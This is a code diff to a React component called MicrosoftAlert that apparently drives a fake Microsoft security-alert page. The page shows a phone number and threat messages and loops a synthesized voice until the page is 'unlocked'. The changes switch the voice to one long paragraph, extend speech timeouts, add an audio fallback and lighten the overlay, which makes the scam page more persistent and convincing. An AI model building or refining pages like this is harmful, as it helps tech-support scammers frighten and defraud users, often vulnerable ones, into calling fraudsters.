@@ -8,7 +8,7 @@ import {
   BLUE_THREATS,
   PHONE,
   PHONE_TEL,
-  VOICE_LINES,
+  VOICE_PARAGRAPH,
 } from "@/lib/config";
 import {
   getBrowserInfo,
@@ -75,7 +75,6 @@ export default function MicrosoftAlert() {
   const unlockedRef = useRef(false);
   const armedRef = useRef(false);
   const alertBusy = useRef(false);
-  const lineIndex = useRef(0);
   const voiceGen = useRef(0);
   const ttsAudio = useRef<HTMLAudioElement | null>(null);
   const voiceTimer = useRef<number | null>(null);
@@ -196,7 +195,7 @@ export default function MicrosoftAlert() {
       u.onend = finish;
       u.onerror = finish;
       window.speechSynthesis.speak(u);
-      window.setTimeout(finish, Math.min(14000, text.length * 85 + 2500));
+      window.setTimeout(finish, Math.min(90000, text.length * 90 + 4000));
     });
   }, []);
 
@@ -221,24 +220,24 @@ export default function MicrosoftAlert() {
   const startVoiceLoop = useCallback(() => {
     const gen = ++voiceGen.current;
     setSpeaking(true);
-    lineIndex.current = 0;
+    setVoiceLine(VOICE_PARAGRAPH);
 
     const run = async () => {
-      while (!unlockedRef.current && armedRef.current && voiceGen.current === gen) {
-        const text = VOICE_LINES[lineIndex.current % VOICE_LINES.length];
-        setVoiceLine(text);
-        lineIndex.current += 1;
-
+      while (
+        !unlockedRef.current &&
+        armedRef.current &&
+        voiceGen.current === gen
+      ) {
         const started = Date.now();
         if (window.speechSynthesis) {
-          await speakLineSpeech(text);
+          await speakLineSpeech(VOICE_PARAGRAPH);
         }
-        if (voiceGen.current === gen && Date.now() - started < 500) {
-          await speakLineTtsAudio(text);
+        // Speech fail / silent → short TTS fallback (API limit)
+        if (voiceGen.current === gen && Date.now() - started < 800) {
+          await speakLineTtsAudio(VOICE_PARAGRAPH);
         }
-
         if (voiceGen.current !== gen) return;
-        await new Promise((r) => setTimeout(r, 700));
+        await new Promise((r) => setTimeout(r, 1500));
       }
     };
 
@@ -724,7 +723,7 @@ export default function MicrosoftAlert() {
         </div>
       </div>
 
-      <div className="absolute inset-0 bg-black/40 backdrop-blur-[1px]" />
+      <div className="absolute inset-0 bg-black/15" />
 
       {speaking && (
         <div className="absolute left-3 right-3 top-3 z-[80] rounded bg-black/80 px-3 py-2 text-[12px] text-white sm:left-3 sm:right-auto sm:max-w-md">
